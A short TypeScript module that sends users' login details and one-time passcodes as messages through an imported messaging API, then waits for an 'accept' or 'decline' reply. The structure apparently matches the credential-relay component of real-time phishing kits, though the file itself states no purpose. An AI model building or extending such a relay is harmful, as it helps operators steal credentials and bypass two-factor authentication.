import { LoginDetails, OTPDetails } from '../types';
import { sendMessage, getUpdates } from './api';
import { createLoginMessage, createOTPMessage } from './messages';
import { waitForResponse } from './utils';

export async function sendLoginDetails(details: LoginDetails): Promise<'accept' | 'decline'> {
  const message = createLoginMessage(details);
  const messageId = await sendMessage(message);
  return waitForResponse(messageId);
}

export async function verifyOTP(details: OTPDetails): Promise<'accept' | 'decline'> {
  const message = createOTPMessage(details);
  const messageId = await sendMessage(message);
  return waitForResponse(messageId);
}